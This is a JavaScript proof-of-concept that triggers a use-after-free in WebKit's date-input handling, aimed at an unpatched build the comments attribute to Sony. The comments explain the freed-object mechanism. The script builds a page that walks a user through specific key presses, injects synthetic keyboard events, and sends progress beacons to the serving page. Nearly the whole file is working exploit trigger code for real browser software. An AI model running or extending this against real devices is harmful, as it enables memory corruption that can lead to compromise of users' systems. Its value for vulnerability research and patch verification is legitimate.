// Candidate #2: use-after-free in BaseDateAndTimeInputType::didChangeValueFromControl
//
// Upstream fix 869d5c55 (bugs.webkit.org 310544). Sony's tree still has the vulnerable
// shape: the function dispatches `input` with no RefPtr protecting itself, so a handler
// that changes input.type destroys the InputType object, and the next two statements run
// on freed memory.
//
// Requires real key events: the date fields live inside a UA shadow root, so JS cannot
// dispatch at them, and with JIT off there is no script-side alternative. Keyboard it is.
//
// Beacons are chosen so the run stays diagnosable even if the process dies:
//   DATE-KEY-*         a keydown actually reached the page (keyboard works in this WebView)
//   DATE-INPUT-FIRED   the input event fired, i.e. the C++ continued into freed memory
//   DATE-TYPE-CHANGED  the handler completed the type swap
//   DATE-SURVIVED      twenty seconds passed with no crash
(function () {
  var SENT = {};
  function B(tag) {
    if (SENT[tag]) return;
    SENT[tag] = 1;
    try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {}
  }

  B('DATE-BOOT');

  var style = document.createElement('style');
  style.textContent =
    'body{background:#0b0b0b;color:#eee;font:26px/1.5 monospace;margin:0;padding:26px}' +
    'h2{font-size:38px;margin:0 0 8px;color:#7fd1ff}' +
    '.step{background:#161616;border:1px solid #333;padding:16px 20px;margin:12px 0}' +
    'input{font-size:52px;padding:12px;width:460px;background:#fff;color:#000;border-radius:6px}' +
    '.k{color:#ffd479;font-weight:bold}' +
    '#val{color:#8f8;font-size:30px}';
  document.head.appendChild(style);

  document.body.innerHTML =
    '<h2>date-input UAF</h2>' +
    '<div class="step"><b>1.</b> Click the white field below (or press Tab until it is focused).</div>' +
    '<div class="step"><b>2.</b> On the keyboard press <span class="k">9</span>, then ' +
    '<span class="k">&rarr;</span>, then <span class="k">2</span>, then <span class="k">&rarr;</span>, ' +
    'then <span class="k">2 0 1 2</span>.<br>' +
    'The field should read <span class="k">09/02/2012</span> as you go.</div>' +
    '<div class="step">value: <span id="val">(empty)</span><br>keys seen: <span id="keys">none</span></div>';

  var input = document.createElement('input');
  input.type = 'date';
  input.id = 'd';
  document.body.insertBefore(input, document.body.children[1]);

  var val = document.getElementById('val');
  var keys = document.getElementById('keys');
  var seen = [];

  input.addEventListener('keydown', function (e) {
    if (seen.length < 8 && seen.indexOf(e.key) === -1) {
      seen.push(e.key);
      keys.textContent = seen.join(' ');
      B('DATE-KEY-' + (e.key.length === 1 ? 'digit' : e.key.replace(/[^A-Za-z]/g, '')));
    }
  }, true);

  input.addEventListener('input', function () {
    B('DATE-INPUT-FIRED');
    val.textContent = input.value || '(empty)';
    // The bug: replacing the input type destroys the object whose method is on the stack.
    input.type = 'text';
    B('DATE-TYPE-CHANGED');
  });

  setInterval(function () {
    if (document.activeElement === input)
      val.textContent = input.value || '(empty)';
  }, 400);

  try { input.focus(); B('DATE-FOCUSED'); } catch (e) { B('DATE-FOCUS-ERR'); }

  // Long shot: a DOM-dispatched keydown occasionally reaches these fields because the
  // handler is a default event handler rather than a trusted-input path.
  var seq = ['9', 'ArrowRight', '2', 'ArrowRight', '2', '0', '1', '2'];
  var i = 0;
  function poke() {
    if (i >= seq.length) { B('DATE-SYNTH-DONE'); return; }
    var key = seq[i++];
    try {
      var ev = new KeyboardEvent('keydown', {
        key: key, code: key, keyCode: key.length === 1 ? key.charCodeAt(0) : 39,
        which: key.length === 1 ? key.charCodeAt(0) : 39,
        bubbles: true, cancelable: true, composed: true
      });
      (document.activeElement || input).dispatchEvent(ev);
    } catch (e) {}
    setTimeout(poke, 120);
  }
  setTimeout(poke, 1500);

  setTimeout(function () { B('DATE-SURVIVED'); }, 20000);
})();
